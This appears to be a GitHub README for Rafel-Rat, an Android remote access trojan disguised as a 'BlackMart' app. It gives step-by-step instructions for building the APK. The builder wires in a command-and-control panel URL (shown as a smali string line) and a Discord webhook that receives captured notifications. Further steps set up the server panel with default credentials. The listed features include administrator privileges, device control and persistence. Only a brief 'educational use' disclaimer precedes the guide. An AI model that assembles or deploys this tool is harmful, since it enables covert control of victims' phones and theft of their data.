
--- 
## Disclaimer
<b>Swagkarna Provides no warranty and will not be responsible for any direct or indirect damage caused by this tool.<br>
Rafel-Rat is built for Educational and Internal use ONLY.</b>

---
### Main Features  :
Administrator privilegesAdministrator privileges
Port forwarding
Accessibility
Device control
Auto-start keep alive
### Prerequisites 
 - Android Studio

OR

- [ApkEasyTool](https://forum.xda-developers.com/android/software-hacking/tool-apk-easy-tool-v1-02-windows-gui-t3333960)
---  
### Building Apk With Android Studio

1.  Open Project ***BlackMart*** in Android Studio 
2.  Put the `command.php` link of server in InternalService.class class
3.  Now open `NotificationListener.java` and enter  replace with your discord webhook url
4.  Build the Project
5.  Zipalign and sign the Apk...
---
### Building Apk with ApkEasyTool:

1. Download <a href="https://github.com/swagkarna/Rafel-Rat/releases/download/release/BlackMart.apk">BlackMartapk</a> and  decompile with `Apktool` and navigate to `smali_classes2\com\velociraptor\raptor`
2. Open `InternalService.smali` 
3. Replace this with your Panel Url ***const-string v0, "https://your-webpanel-url/public/commands.php"***
4. Now open `NotificationListener.smali` and enter replace with your discord webhook url

---
### Building Server 
1. Upload Files in server Folder to Your HostingPanel
2. Now Open login.php 
3. Enter Username ***Hande*** Password ***Ercel***
4. Note : Make Sure your webhosting site uses Https and should have valid connection...I recommend 000webhost.com
5. You can now use panel to send commands and also refresh after it
---
### Rafel-Rat in Action [OLD] :

https://user-images.githubusercontent.com/46685308/120080601-603c5380-c0d7-11eb-82b2-345d0bff7581.mp4

Watch Video in Full Screen For Better Quality

---
## Screenshots[New]
| | | |
|:-------------------------:|:-------------------------:|:-------------------------:|
|<a href="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(70).png?raw=true"> <img width="2000" src="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(70).png?raw=true"> Panel-1</a> | <a href="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(71).png?raw=true"> <img width="2000" src="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(71).png?raw=true"> Panel-2</a> |<a href="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(72).png?raw=trueg"> <img width="2000" src="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(72).png?raw=true"> Panel-3 </a>||

---
